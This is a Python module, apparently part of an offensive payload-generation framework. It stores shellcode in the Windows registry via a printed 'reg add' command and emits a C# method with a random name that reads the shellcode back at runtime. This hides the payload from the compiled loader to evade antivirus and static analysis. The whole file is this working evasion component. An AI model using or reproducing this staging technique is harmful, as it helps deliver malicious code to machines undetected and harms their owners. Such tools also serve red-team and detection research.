import random
import string
import json
from cs.utils.formatters import *

class regkey:

    def __init__(self, shellcode, arguments):
        self.name = ''.join(random.SystemRandom().choice(string.ascii_uppercase) for _ in range(16))
        if 'path' in arguments:
            self.path = arguments['path']
        else:
            self.path = 'HKEY_CURRENT_USER\\Software\\'
        if 'key' in arguments:
            self.key = arguments['key']
        else:
            self.key = 'test'
        self.type = type(shellcode).__name__
        if self.type == 'str':
            print(f'reg add "{self.path}" /v "{self.key}" /t REG_SZ /d "{shellcode}" /f')
        elif self.type == 'list':
            print(f'reg add "{self.path}" /v "{self.key}" /t REG_MULTI_SZ /s ";" /d "{';'.join(shellcode)}" /f')
        elif self.type == 'bytes':
            print(f'reg add "{self.path}" /v "{self.key}" /t REG_BINARY /d "{shellcode.hex()}" /f')

    def imports(self):
        return ['using Microsoft.Win32;']

    def codeblock(self):

        if self.type == 'str':
            return f"""
            public static String {self.name}()
            {{
                string obfuscated = (string)Registry.GetValue(@"{self.path}", "{self.key}", "");
                return obfuscated;
            }}
"""
        elif self.type == 'list':
            return f"""
            public static String[] {self.name}()
            {{
                string[] obfuscated = (string [])Registry.GetValue(@"{self.path}", "{self.key}", "");
                return obfuscated;
            }}
"""
        elif self.type == 'bytes':
            return f"""
            public static byte[] {self.name}()
            {{
                byte[] obfuscated = (byte[])Registry.GetValue(@"{self.path}", "{self.key}", "");
                return obfuscated;
            }}
"""

    def compilerOptions(self):
        return []

    def transformer(self, shellcodestring):
        return shellcodestring.format(shellcode=f'{self.name}()')
